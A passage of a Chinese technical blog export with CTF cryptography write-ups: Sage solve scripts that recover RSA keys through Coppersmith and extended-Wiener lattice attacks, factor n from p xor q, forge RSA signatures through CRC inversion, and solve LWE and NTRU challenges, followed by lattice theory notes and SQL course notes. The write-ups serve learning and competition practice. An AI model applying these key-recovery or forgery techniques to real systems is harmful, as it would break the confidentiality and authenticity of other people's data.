<h2 id="babyrsa">babyrsa</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p_high = <span class="number">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span></span><br><span class="line">q_low = <span class="number">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span></span><br><span class="line">n = <span class="number">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span></span><br><span class="line">enc = <span class="number">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">mod = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">265</span>)</span><br><span class="line">p0 = n * inverse_mod(q_low,mod) % mod</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">5</span>):</span><br><span class="line">    f = p_high * (<span class="number">2</span>^<span class="number">724</span>) + p0 + (x * <span class="number">32</span> + i) * mod</span><br><span class="line">    f = f.monic()</span><br><span class="line">    out_p = f.small_roots(<span class="number">2</span>^<span class="number">454</span>,<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(out_p) != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(out_p[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p = out_p[<span class="number">0</span>] * <span class="number">32</span> + i * mod + p_high * (<span class="number">2</span>^<span class="number">724</span>) + p0</span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line">p = <span class="number">133637329398256221348922087205912367118213472434713498908220867690672019569057789598459580146410501473689139466275052698529257254973211963162087316149628000798221014338373126500646873612341158676084318494058522014519669302359038980726479317742766438142835169562422371156257894374341629012755597863752154328407</span></span><br><span class="line"><span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">q = n // p</span><br><span class="line">fai_n = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,fai_n)</span><br><span class="line">m = <span class="built_in">pow</span>(enc,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.decode(long_to_bytes(m)))</span><br></pre></td></tr></table></figure>
<p>q_low可以通过n逆到p_low，通过small_roots求解</p>
<h2 id="wieners-attack">Wiener’s Attack</h2>
<p>连分数定理 <span class="math display">\[
当|x−\frac{a}{b}|&lt;\frac{1}{2b^2}时，\frac{a}{b}是x的一个连分数近似。
\]</span> 用t和_n能求出u，但是在求u的过程中可求p和q。</p>
<p>求出e1后，e1和e2可以用扩展维纳求解m。</p>
<h3 id="扩展维纳">扩展维纳</h3>
<p><span class="math display">\[
g = gcd(p-1, q-1) \\
ed = 1 + k(p-1)(q-1)\\
edg = g + k(p-1)(q-1)\tag{1}
\]</span></p>
<p><span class="math display">\[
e_1d_1 = 1+k_1\phi(N)\\
e_2d_2 = 1+k_2\phi(N)\\
e_1d_1k_2-e_2d_2k_1=k_2-k_1\tag{2}
\]</span></p>
<p>从而可得 <span class="math display">\[
A*L=B\\
A=(k_1k_2,d_1gk_2,d_2gk_1, d_1d_2g^2)\\
L=\begin{bmatrix}
1&amp;-N&amp;0&amp;N^2\\
0&amp;e_1&amp;-e_1&amp;-e_1N\\
0&amp;0&amp;-e_2&amp;-e_2N\\
0&amp;0&amp;0&amp;e_1e_2
\end{bmatrix}\\
B=(k_1k_2,k_2(g+k_1s),g(k_1−k_2),(g+k_1s)(g+k_2s))
\]</span> L为格基，若B为最短向量可用LLL求解。 <span class="math display">\[
只有满足\lambda_1(L)\le\sqrt{N}det(L)^\frac{1}{n}才是最短向量。
\]</span> 现成的格子： <span class="math display">\[
M_1=N^{0.5}, M_2=N^{1+\alpha},\\
L第一列乘N，第二列乘M_1, 第三列乘M_2,得\\
L_2=\begin{bmatrix}
N&amp;-M_1N&amp;0&amp;N^2\\
0&amp;M_1e_1&amp;-M_2e_1&amp;-e_1N\\
0&amp;0&amp;-M_2e_2&amp;-e_2N\\
0&amp;0&amp;0&amp;e_1e_2
\end{bmatrix}\\
B=(k_1k_2N,k_2(g+k_1s)M_1,g(k_1-k_2)M_2,(g+k_1s)(g+k_2s))\\
所以||B_2||\le2N^{1+2\alpha}\le\sqrt{N}det(L)^\frac{1}{n}=2N^{\frac{1}{4}(\alpha+\frac{13}{2})}\\
求得\alpha\le\frac{5}{14}.\\
然后可以将\alpha带入M_2用LLL求最短向量B_2，右乘L_2的逆求A，由A的前两项求解。
\]</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line">c = <span class="number">6472367338832635906896423990323542537663849304314171581554107495210830026660211696089062916158894195561723047864604633460433867838687338370676287160274165915800235253640690510046066541445140501917731026596427080558567366267665887665459901724487706983166070740324307268574128474775026837827907818762764766069631267853742422247229582756256253175941899099898884656334598790711379305490419932664114615010382094572854799421891622789614614720442708271653376485660139560819668239118588069312179293488684403404385715780406937817124588773689921642802703005341324008483201528345805611493251791950304129082313093168732415486813</span></span><br><span class="line">e2 = <span class="number">27188825731727584656624712988703151030126350536157477591935558508817722580343689565924329442151239649607993377452763119541243174650065563589438911911135278704499670302489754540301886312489410648471922645773506837251600244109619850141762795901696503387880058658061490595034281884089265487336373011424883404499124002441860870291233875045675212355287622948427109362925199018383535259913549859747158348931847041907910313465531703810313472674435425886505383646969400166213185676876969805238803587967334447878968225219769481841748776108219650785975942208190380614555719233460250841332020054797811415069533137170950762289</span></span><br><span class="line">e1 = <span class="number">114552459553730357961013268333698879659007919035942930313432809776799669181481660306531243618160127922304264986001501784564575128319884991774542682853466808329973362019677284072646678280051091964555611220961719302320547405880386113519147076299481594997799884384012548506240748042365643212774215730304047871679706035596550898944580314923260982768858133395187777029914150064371998328788068888440803565964567662563652062845388379897799506439389461619422933318625765603423604615137217375612091221578339493263160670355032898186792479034771118678394464854413824347305505135625135428816394053078365603937337271798774138959</span></span><br><span class="line">N  = <span class="number">14922959775784066499316528935316325825140011208871830627653191549546959775167708525042423039865322548420928571524120743831693550123563493981797950912895893476200447083386549353336086899064921878582074346791320104106139965010480614879592357793053342577850761108944086318475849882440272688246818022209356852924215237481460229377544297224983887026669222885987323082324044645883070916243439521809702674295469253723616677245762242494478587807402688474176102093482019417118703747411862420536240611089529331148684440513934609412884941091651594861530606086982174862461739604705354416587503836130151492937714365614194583664241</span></span><br><span class="line">a  = <span class="number">0.356</span><span class="comment">#731./2049</span></span><br><span class="line">M1=N**<span class="number">0.5</span></span><br><span class="line">M2= N **(a+<span class="number">1</span>)</span><br><span class="line">D = diagonal_matrix(ZZ,[N,M1,M2,<span class="number">1</span>])</span><br><span class="line">M=matrix(ZZ,[[<span class="number">1</span>,-N,<span class="number">0</span>,N**<span class="number">2</span>],[<span class="number">0</span>,e1,-e1,-e1*N],[<span class="number">0</span>,<span class="number">0</span>,e2,-e2*N],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,e1*e2]])*D</span><br><span class="line">L=M.LLL()</span><br><span class="line">t=vector(ZZ,L[<span class="number">0</span>])</span><br><span class="line">x=M.solve_left(t)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line">phi = <span class="built_in">int</span>(x[<span class="number">1</span>]/x[<span class="number">0</span>]*e1)</span><br><span class="line">d = invert(<span class="number">0x10001</span>,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,N)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">9082754779802416065229245885387712939943943582794993779715278978532329981453479995551082109</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">g = gcd(p-1, q-1)</span></span><br><span class="line"><span class="string">矩阵A等于[k1k2, d1gk2, d2gk1, d1d2g^2] 即为x</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="xor_1">xor_1</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_pq</span>(<span class="params">n, x</span>):</span><br><span class="line">    a = [<span class="number">0</span>]</span><br><span class="line">    b = [<span class="number">0</span>]</span><br><span class="line">    maskx = <span class="number">1</span></span><br><span class="line">    maskn = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">        xbit = (x &amp; maskx) &gt;&gt; i</span><br><span class="line">        nbit = n % maskn</span><br><span class="line">        t_a = []</span><br><span class="line">        t_b = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">            <span class="keyword">for</span> aa <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> bb <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">if</span> aa ^ bb == xbit:</span><br><span class="line">                        tmp2 = n % maskn</span><br><span class="line">                        tmp1 = (aa * maskn // <span class="number">2</span> + a[j]) * (bb * maskn // <span class="number">2</span> + b[j]) % maskn</span><br><span class="line">                        <span class="keyword">if</span> tmp1 == tmp2:</span><br><span class="line">                            t_a.append(aa * maskn // <span class="number">2</span> + a[j])</span><br><span class="line">                            t_b.append(bb * maskn // <span class="number">2</span> + b[j])</span><br><span class="line">        maskx *= <span class="number">2</span></span><br><span class="line">        maskn *= <span class="number">2</span></span><br><span class="line">        a = t_a</span><br><span class="line">        b = t_b</span><br><span class="line">    <span class="keyword">for</span> a1, b1 <span class="keyword">in</span> <span class="built_in">zip</span>(a, b):</span><br><span class="line">        <span class="keyword">if</span> a1 * b1 == n1:</span><br><span class="line">            <span class="keyword">return</span> a1, b1</span><br></pre></td></tr></table></figure>
<p>每一位异或都有四种情况（00,01,10,11）通过n的低位可以约束这四种情况，从低位到高位依次遍历可解。</p>
<h2 id="rsaos">RSAOS</h2>
<p>普通指令先CRC签名再RSA签名，特权指令先foldhash签名再RSA签名。当enable打开时，普通指令也需要foldhash签名。</p>
<p>foldhash实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sha1_s = sha1(s).digest()</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(sha1_s[:<span class="number">10</span>], sha1_s[<span class="number">10</span>:]))</span><br></pre></td></tr></table></figure>
<p>由于程序的判断条件，指令后可以跟其他字符，签名时是签一整个指令。</p>
<p>然后便可以找到多个CRC的签名使之乘积等于get-flag的foldhash签名，又由于RSA的乘法同态，最后签名得出的结果是一样的。</p>
<p>于是就可以<a href="%5Bresilar/crchack:%20Reversing%20CRC%20for%20fun%20and%20profit%20(github.com)%5D(https://github.com/resilar/crchack)">CRC求逆</a>，每个foldhash的因子不应该超过CRC32要求的32位。可选择get-flag 999。</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>格密码</title>
    <url>/2022/06/20/%E6%A0%BC%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="格密码">格密码</h1>
<p>一直想做一个整理，鸽了两个多月，考完试把之前鸽的补一下</p>
<span id="more"></span>
<h2 id="格中的困难问题">格中的困难问题</h2>
<h3 id="svp最短向量问题">SVP：最短向量问题</h3>
<p>给定一个基为B的Lattice L(B)，找到一个这个基构成的格点Bx:x，使得这个点距离0坐标点的距离最近。</p>
<p>SVP的宽松版本：<img src="https://www.zhihu.com/equation?tex=SVP_%5Cgamma" alt="[公式]">，即找到一个基构成的格点Bx:x，使得这个店距离原点的距离小于最短距离的<img src="https://www.zhihu.com/equation?tex=%5Cgamma" alt="[公式]">倍即可。</p>
<h3 id="cvp最近向量问题">CVP：最近向量问题</h3>
<p>给定连续空间中任意的一个点t，找到距离这个点最近的格点Bx。</p>
<p>同理可得，我们也可以得到CVP的宽松版，即<img src="https://www.zhihu.com/equation?tex=CVP_%5Cgamma" alt="[公式]">。</p>
<h3 id="sivp最短独立向量问题">SIVP：最短独立向量问题</h3>
<p>给定一个Lattice <img src="https://www.zhihu.com/equation?tex=%5Cmathcal%7BL%7D%28%5Cmathbf%7BB%7D%29" alt="[公式]">，找到<img src="https://www.zhihu.com/equation?tex=n" alt="[公式]">个线性独立的向量<img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BBx_1%2C+%5Cdots%2C+Bx_n%7D" alt="[公式]">并且这些向量的长度都要小于等于最长的最短向量<img src="https://www.zhihu.com/equation?tex=%5Clambda_n" alt="[公式]">。</p>
<p>和SVP与CVP问题一样，我们也可以给出SIVP问题的宽松版定义，即<img src="https://www.zhihu.com/equation?tex=SIVP_%5Cgamma" alt="[公式]">。</p>
<h2 id="基于lattice的信息传输">基于lattice的信息传输</h2>
<p>首先，我们把需要传输的消息映射到Lattice中的一个点上，即Bx，然后把L和Bx发送出去。因为噪音，Bx会在L上产生偏移，首先我们需要求解SVP问题，寻找到L上的最短向量，并让其与噪音相比较，观察能否恢复出明文。然后若想恢复出明文，需要解决CVP问题，找到被噪声影响的密文的最近格点，一般来说就是映射到格上的明文。</p>
<h2 id="lll算法">LLL算法</h2>
<p>施密特正交化可以让一组坏基变成一组垂直的好基，而LLL算法可以找到在正交化的基础上最短或者近似最短的正交基。</p>
<h2 id="lwe问题错误学习">LWE问题：错误学习</h2>
<p>先放一道题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">prime = <span class="number">2141</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(flag)</span><br><span class="line">flag = <span class="built_in">map</span>(<span class="built_in">ord</span>, flag)</span><br><span class="line">flag1 = flag[:<span class="number">21</span>]</span><br><span class="line">flag2 = flag[<span class="number">21</span>:]</span><br><span class="line">row = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">msg1, msg2</span>):</span><br><span class="line">    <span class="keyword">return</span> [(x + y) % prime <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(msg1, msg2)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multi</span>(<span class="params">msg1, msg2</span>):</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> msg1:</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(l, msg2):</span><br><span class="line">            s += (x * y) % prime</span><br><span class="line">            s %= prime</span><br><span class="line">        out.append(s)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genkey</span>(<span class="params">leng</span>):</span><br><span class="line">    l = [[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(row):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(leng):</span><br><span class="line">            l[x].append(random.randint(<span class="number">0</span>, <span class="number">511</span>))</span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = genkey(<span class="built_in">len</span>(flag1))</span><br><span class="line"><span class="built_in">print</span> key</span><br><span class="line"></span><br><span class="line">cipher1 = multi(key, flag1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> cipher1</span><br><span class="line"></span><br><span class="line">cipher2 = multi(key, flag2)</span><br><span class="line"></span><br><span class="line">noise = [random.randint(<span class="number">0</span>, <span class="number">6</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line"><span class="built_in">print</span> add(noise, cipher2)</span><br></pre></td></tr></table></figure>
<p>flag的前半部分为普通的矩阵相乘，后半部分在矩阵相乘的基础上加入了噪音。</p>
<p>首先如果噪音是0的话，相乘出的结果就是L上的一个格点。现在加入了噪音，我们得到的就是某个格点附近的向量。这时，我们只需要求解CVP问题即可求解LWE问题。同时，CVP问题可以被规约到SIVP问题上，也就是说LWE问题的困难度是基于最坏情况的SIVP困难度的。</p>
<p>给出解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage脚本 LWE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> starmap</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> mul</span><br><span class="line"></span><br><span class="line">key = </span><br><span class="line">p=<span class="number">2141</span></span><br><span class="line">b=</span><br><span class="line">A=Matrix(Zmod(p),key)</span><br><span class="line"><span class="built_in">print</span>(A.solve_right(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closest_vector</span>(<span class="params">M, G, target</span>):</span><br><span class="line">    small = target</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(M.nrows())):</span><br><span class="line">            c = ((small * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">            small -= M[i] * c</span><br><span class="line">    <span class="keyword">return</span> target - small</span><br><span class="line"></span><br><span class="line">m = <span class="number">64</span></span><br><span class="line">n = <span class="number">21</span></span><br><span class="line">q = <span class="number">2141</span></span><br><span class="line"></span><br><span class="line">A_values = </span><br><span class="line"></span><br><span class="line">b_values = </span><br><span class="line">A = matrix(ZZ, m + n, m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    A[i, i] = q</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        A[m + y, x] = A_values[x][y]</span><br><span class="line">lattice = IntegerLattice(A, lll_reduce=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;LLL done&quot;</span>)</span><br><span class="line">gram = lattice.reduced_basis.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">target = vector(ZZ, b_values)</span><br><span class="line">res = closest_vector(lattice.reduced_basis, gram, target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Closest Vector: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(res))</span><br><span class="line"></span><br><span class="line">R = IntegerModRing(q)</span><br><span class="line">M = Matrix(R, A_values)</span><br><span class="line">ingredients = M.solve_right(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Ingredients: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(ingredients))</span><br></pre></td></tr></table></figure>
<h2 id="ntru加密">NTRU加密</h2>
<p>NTRU的本质就是SVP问题。实际上，LLL算法及其变种算法是目前已知在较低维度的lattice中求解SVP的最好的算法，但是在较高维度中就比较乏力。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">d = <span class="number">1888131080991802984469142252767428996708357845414525789382920257253450734136628648374571804259719424143388465346476293366644738737089607039465127514487405</span></span><br><span class="line">p = <span class="number">30611187447617951438057661643828594439836168499045103637492727875883545693704706710809270955729333435251594169116242188128775616562859932991842965711916421973513501170770682029019363173114263880664543027598219327851802812372758784840490412167556903172872555298867886904331797406762790534760341763270179874103596315439602969532398796744300268959212967152977297923303435136058320818336169166426865495487391347983169818270302355278949814298699167819318471127268309841253880404251042151162557234493453591687370817297674493012095163546638810088146738185919186385185115618449986759562697777952684453338987559120695742612663</span></span><br><span class="line">h = <span class="number">21312401103364823065661625965265254047976261102113426643161584691333735528853578330462720782012571325209425607725450902072660790420041271498835143983658324491397948972480792470439905794590608772344151134928174674417907495690758864900707486731428987072095395641677518641643685295486795802883828831926635233976602465690044844008674887604376578289424972631509896184649710918327894604786477135136421222185152303050748164371324119467682895596417745201794158939881061666663709040766320031697689020600295103351632352583239176099726804730980876514993290370570966082812844360442005544939574202193639394320702060361753336559136</span></span><br><span class="line">c = <span class="number">16940539604003327722979410435578617956215682038759397881493708848549559668095838737615772551889674113155566943460688615187510308352387746131182860772735244685105354949311113745596385193812888514879929848085807780411336350803009420541916609478955298130063431885517727744668841197297817243205861167004168641880226875601283896199831113765890902106375084917385016349416483298441391462272070565319424930392336694536562067484570233782710064495559877940944602837436374378241977922432719824129042239016560841938886647111460591440853620154778487323813228157104022518913321245126759601657046000849672318847957185592562785436558</span></span><br><span class="line"></span><br><span class="line">m = matrix(ZZ, [[<span class="number">1</span>, h], [<span class="number">0</span>, p]])</span><br><span class="line">f, g = m.LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(f, g)</span><br><span class="line">a = f*c % p % g</span><br><span class="line">m = a * inverse_mod(f, g) % g</span><br><span class="line"><span class="keyword">assert</span> m == d</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p>在格基[1,h]和[0,p]上，[f,g]是其中的最短向量。通过LLL算法求解出f,g后，通过一系列计算可得m。</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>格</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库复习</title>
    <url>/2022/06/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="第三章">第三章</h1>
<h2 id="基本类型">基本类型</h2>
<p>char(n)固定长度的字符串。</p>
<p>varchar(n)可变长度的字符串，最大长度n。</p>
<p>int 整数。</p>
<p>smallint 小整数。</p>
<p>numeric(p,d)定点数，p位数字其中d位在小数点右边。</p>
<span id="more"></span>
<p>float(n)精度至少为n的浮点数。</p>
<p>创建一个表:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> department</span><br><span class="line">(</span><br><span class="line">    dept_name <span class="type">varchar</span>(<span class="number">20</span>), #最大长度为<span class="number">20</span>的字符串</span><br><span class="line">    building <span class="type">varchar</span>(<span class="number">15</span>), # 最大长度为<span class="number">15</span>的字符串</span><br><span class="line">    budget <span class="type">numeric</span>(<span class="number">12</span>, <span class="number">2</span>), # <span class="number">12</span>位数，<span class="number">2</span>位小数</span><br><span class="line">    <span class="keyword">primary</span> key (dept_name) # 主码是dept_name，可选</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>sql查询的基本结构：select、from、where。查询后会出现重复。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> dept_name # <span class="keyword">distinct</span>强行去除重复</span><br><span class="line"><span class="keyword">from</span> instructor;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">all</span> dept_name # <span class="keyword">all</span>显式指明不去除重复</span><br><span class="line"><span class="keyword">from</span> instructor; </span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name</span><br><span class="line"><span class="keyword">from</span> instructor </span><br><span class="line"><span class="keyword">where</span> dept_name <span class="operator">=</span> <span class="string">&#x27;Music&#x27;</span> <span class="keyword">and</span> salary <span class="operator">&gt;</span> <span class="number">70000</span>;</span><br></pre></td></tr></table></figure>
<h2 id="多关系查询">多关系查询</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name, instructor.dept_name, building</span><br><span class="line"><span class="keyword">from</span> instructor,department</span><br><span class="line"><span class="keyword">where</span> instructor.dept_name<span class="operator">=</span>department.dept_name;</span><br></pre></td></tr></table></figure>
<p>select子句用于列出查询结果中所需要的属性。</p>
<p>from子句是一个查询求值中需要访问的关系列表。</p>
<p>where子句是一个作用在from子句中关系的属性上的谓词。</p>
<p>通过from子句定义了一个列出的关系上的笛卡尔积。若没有where则会输出该笛卡尔积。</p>
<p>SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。</p>
<h2 id="重命名关系">重命名关系</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> T.name, S.course_id</span><br><span class="line"><span class="keyword">from</span> instructor <span class="keyword">as</span> T, teaches <span class="keyword">as</span> S</span><br><span class="line"><span class="keyword">where</span> T.ID <span class="operator">=</span> S.ID;</span><br></pre></td></tr></table></figure>
<h2 id="比较运算符">比较运算符</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dept_name</span><br><span class="line"><span class="keyword">from</span> department </span><br><span class="line"><span class="keyword">where</span> building <span class="keyword">like</span> <span class="string">&#x27;%Watson%&#x27;</span>; # 匹配子串包含Watson的字符串</span><br><span class="line"><span class="keyword">like</span> <span class="string">&#x27;ab\%cd%&#x27;</span> <span class="keyword">escape</span> <span class="string">&#x27;\&#x27;</span> # 用<span class="keyword">escape</span>转义，匹配以ab<span class="operator">%</span>cd开头的字符串</span><br></pre></td></tr></table></figure>
<h2 id="显示次序">显示次序</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name </span><br><span class="line"><span class="keyword">from</span> instructor</span><br><span class="line"><span class="keyword">where</span> dept_name <span class="operator">=</span> <span class="string">&#x27;Physics&#x27;</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> name;</span><br></pre></td></tr></table></figure>
<p>##　升降序</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">from</span> instructor</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> salary <span class="keyword">desc</span>, name <span class="keyword">asc</span>; # 工资降序排列，若工资相同则姓名升序排列。</span><br></pre></td></tr></table></figure>
<h2 id="where子句">where子句</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name</span><br><span class="line"><span class="keyword">from</span> instructor</span><br><span class="line"><span class="keyword">where</span> salary <span class="keyword">between</span> <span class="number">90000</span> <span class="keyword">and</span> <span class="number">100000</span>;</span><br></pre></td></tr></table></figure>
<h2 id="记号比较">记号比较</h2>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name,course_id</span><br><span class="line"><span class="keyword">from</span> instructor,teaches</span><br><span class="line"><span class="keyword">where</span> (instructor.ID, dept_name)<span class="operator">=</span>(teaches.ID, <span class="string">&#x27;Biology&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="集合运算">集合运算</h2>
<p>采用union,intersect,except对应并，交，差</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(</span><br><span class="line">    <span class="keyword">select</span> course_id</span><br><span class="line">    <span class="keyword">from</span> section</span><br><span class="line">    <span class="keyword">where</span> semester <span class="operator">=</span> <span class="string">&#x27;Fall&#x27;</span> <span class="keyword">and</span> <span class="keyword">year</span> <span class="operator">=</span> <span class="number">2009</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">(</span><br><span class="line">    <span class="keyword">select</span> course_id</span><br><span class="line">    <span class="keyword">from</span> section</span><br><span class="line">    <span class="keyword">where</span> semester <span class="operator">=</span> <span class="string">&#x27;Spring&#x27;</span> <span class="keyword">and</span> <span class="keyword">year</span> <span class="operator">=</span> <span class="number">2010</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>union自动去重。</p>
<h2 id="空值">空值</h2>
<p>空值与true,false对应，为unknown。空值与任何值运算为空值。</p>
<h2 id="聚集函数">聚集函数</h2>
<p>平均值：avg</p>
<p>最小值：min</p>
<p>最大值：max</p>
<p>总和：sum</p>
<p>计数：count</p>
